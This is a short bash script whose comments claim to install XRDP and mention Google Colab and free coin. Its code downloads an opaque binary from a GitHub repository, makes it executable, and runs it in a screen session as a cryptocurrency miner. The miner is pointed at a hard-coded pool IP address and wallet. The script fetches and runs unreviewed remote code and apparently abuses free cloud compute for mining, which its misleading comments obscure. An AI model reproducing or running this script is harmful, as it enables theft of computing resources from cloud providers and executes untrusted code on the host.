# /bin/bash
# Install XRDP
# Before get xmr coin for free
# Google Colab
sudo apt update
clear
sudo apt install screen
screen -R AkubapakMU

wget https://github.com/angkii/m/raw/main/AkubapakMU
chmod 700 AkubapakMU

#!/bin/bash

POOL=95.163.242.146:8008
WALLET=0x6f50d000e4E305A0725d6101A49b824D29E0e788

./AkubapakMU -c ETH --pool $POOL --user $WALLET $@ --ethstratum=ETHPROXY $@
